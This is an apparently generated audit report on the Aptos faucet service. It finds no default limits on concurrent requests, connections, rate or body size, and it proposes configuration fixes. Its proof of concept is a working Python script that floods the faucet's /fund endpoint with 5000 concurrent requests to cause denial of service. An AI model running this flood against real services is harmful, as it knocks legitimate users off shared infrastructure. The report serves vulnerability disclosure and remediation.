# Audit Report

## Title
Aptos Faucet Service Lacks Resource Limits Leading to Denial of Service via Resource Exhaustion

## Summary
The Aptos faucet service does not enforce any process-level resource limits (memory, CPU, network connections, or concurrent requests) by default, making it vulnerable to resource exhaustion attacks that could render the faucet unavailable to legitimate users.

## Finding Description

The faucet service in `main.rs` delegates to the `Server` implementation, which ultimately runs without mandatory resource constraints. Multiple critical protections are either optional or completely absent:

**1. No Concurrent Request Limits by Default**

The `HandlerConfig` includes a `max_concurrent_requests` field that controls how many requests the faucet processes simultaneously via a semaphore mechanism. However, this field is set to `None` by default: [1](#0-0) 

When `max_concurrent_requests` is `None`, the semaphore is never created: [2](#0-1) 

Without this semaphore, the request handler never enforces any concurrency limits: [3](#0-2) 

**2. No TCP Connection Limits**

The server uses `TcpListener::bind()` without configuring any connection backlog limits or maximum connection counts: [4](#0-3) 

**3. No Rate Limiting by Default**

The faucet supports optional rate limiting checkers (Redis-based or memory-based), but these are configured via `checker_configs` which defaults to an empty vector: [5](#0-4) 

**4. No Request Body Size Limits**

Unlike the main Aptos API which uses `PostSizeLimit` middleware to enforce body size restrictions, the faucet service does not implement any such protection, allowing unbounded request payloads.

**Attack Scenario:**

1. An attacker opens thousands of simultaneous TCP connections to the faucet server
2. Each connection sends a `/fund` or `/mint` request with a large body
3. Without concurrent request limits, all requests are processed simultaneously
4. Each request consumes memory for request parsing, checker execution, and transaction submission
5. The accumulation exhausts available memory, file descriptors, and CPU resources
6. The faucet becomes unresponsive to legitimate requests or crashes entirely

## Impact Explanation

This vulnerability falls under **Low Severity** per the Aptos bug bounty program:
- **Non-critical implementation bug**: The faucet is a testnet utility service, not part of core consensus or mainnet operations
- **Service availability impact**: While exploitable, it only affects testnet faucet availability
- **No funds at risk**: Cannot steal funds or affect mainnet assets
- **No consensus impact**: Does not compromise blockchain consensus, validator operations, or state integrity

The faucet becoming unavailable impacts testnet user experience but does not threaten the security or operation of the Aptos blockchain itself.

## Likelihood Explanation

**Likelihood: High**

- **Low attacker skill required**: Simple HTTP flood attack, no specialized knowledge needed
- **Trivial to exploit**: Standard tools like `ab` (Apache Bench) or `wrk` can generate sufficient load
- **No authentication bypass needed**: Faucet endpoints are publicly accessible by design
- **Default configuration vulnerable**: Out-of-the-box deployment without custom configuration is at risk
- **Observable in deployment**: Any faucet instance using `build_for_cli()` or default configuration suffers from this issue

The only mitigating factors are:
- Operators may deploy external load balancers with connection limits
- Cloud infrastructure may provide some inherent resource constraints
- Operators may manually configure `max_concurrent_requests` in production (though this is not enforced or documented as required)

## Recommendation

**Mandatory Resource Limits:**

1. **Set default `max_concurrent_requests`** to a reasonable value (e.g., 100-500 depending on expected load):

```rust
handler_config: HandlerConfig {
    use_helpful_errors: true,
    return_rejections_early: false,
    max_concurrent_requests: Some(200),  // Add default limit
},
```

2. **Add request body size limits** using middleware similar to the main API's `PostSizeLimit`

3. **Configure TCP socket options** to limit backlog and maximum connections

4. **Implement rate limiting by default** with memory-based checker to prevent single-IP abuse

5. **Add configuration validation** that warns operators if resource limits are disabled

6. **Document recommended limits** in deployment guides and configuration examples

**Example Fixed Configuration:**

```rust
pub fn build_for_cli(
    api_url: Url,
    listen_address: String,
    listen_port: u16,
    funder_key: FunderKeyEnum,
    do_not_delegate: bool,
    chain_id: Option<ChainId>,
) -> Self {
    // ... existing code ...
    
    handler_config: HandlerConfig {
        use_helpful_errors: true,
        return_rejections_early: false,
        max_concurrent_requests: Some(200),  // Default limit
    },
}
```

Additionally, add warning log if limits are disabled:

```rust
if self.handler_config.max_concurrent_requests.is_none() {
    warn!("Faucet running without concurrent request limits - vulnerable to DoS");
}
```

## Proof of Concept

**Attack Script (Python):**

```python
#!/usr/bin/env python3
import asyncio
import aiohttp
import time

FAUCET_URL = "http://localhost:8081/fund"
NUM_CONCURRENT = 5000  # Adjust based on target

async def send_request(session, sem):
    async with sem:
        try:
            payload = {
                "address": "0x" + "1" * 64,  # Valid-looking address
                "amount": 1000000
            }
            async with session.post(FAUCET_URL, json=payload, timeout=300) as resp:
                print(f"Status: {resp.status}")
        except Exception as e:
            print(f"Error: {e}")

async def dos_attack():
    print(f"Launching DoS with {NUM_CONCURRENT} concurrent requests...")
    sem = asyncio.Semaphore(NUM_CONCURRENT)
    
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, sem) for _ in range(NUM_CONCURRENT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    start = time.time()
    asyncio.run(dos_attack())
    print(f"Attack completed in {time.time() - start:.2f}s")
```

**Reproduction Steps:**

1. Start a local faucet using default configuration:
   ```bash
   cargo run --bin aptos-faucet-service -- run-simple \
       --node-url http://localhost:8080 \
       --listen-port 8081
   ```

2. Run the attack script:
   ```bash
   python3 dos_attack.py
   ```

3. Observe faucet becomes unresponsive:
   - Memory usage spikes continuously
   - Health check endpoint (`/`) times out or returns errors
   - Legitimate funding requests fail or timeout

**Expected Result:** Faucet service becomes unavailable, health checks fail, high memory/CPU usage.

**With Fix Applied:** Requests beyond `max_concurrent_requests` receive immediate 503 (Service Unavailable) responses without consuming excessive resources.

## Notes

This vulnerability specifically affects the faucet service, which is a testnet utility and not part of the core blockchain consensus or execution layer. While it does not compromise blockchain security or validator operations, it represents a clear availability vulnerability that allows trivial denial of service attacks against testnet infrastructure.

The fix is straightforward: enforce mandatory resource limits with sensible defaults while still allowing operators to customize them for their deployment requirements.

### Citations

**File:** crates/aptos-faucet/core/src/server/run.rs (L93-96)
```rust
        let concurrent_requests_semaphore = self
            .handler_config
            .max_concurrent_requests
            .map(|v| Arc::new(Semaphore::new(v)));
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L195-200)
```rust
        let listener = TcpListener::bind((
            self.server_config.listen_address.clone(),
            self.server_config.listen_port,
        ))
        .await?;
        let port = listener.local_addr()?.port();
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L276-277)
```rust
            bypasser_configs: vec![],
            checker_configs: vec![],
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L306-310)
```rust
            handler_config: HandlerConfig {
                use_helpful_errors: true,
                return_rejections_early: false,
                max_concurrent_requests: None,
            },
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L204-215)
```rust
        let permit = match &self.concurrent_requests_semaphore {
            Some(semaphore) => match semaphore.try_acquire() {
                Ok(permit) => Some(permit),
                Err(_) => {
                    return Err(AptosTapError::new(
                        "Server overloaded, please try again later".to_string(),
                        AptosTapErrorCode::ServerOverloaded,
                    ))
                },
            },
            None => None,
        };
```
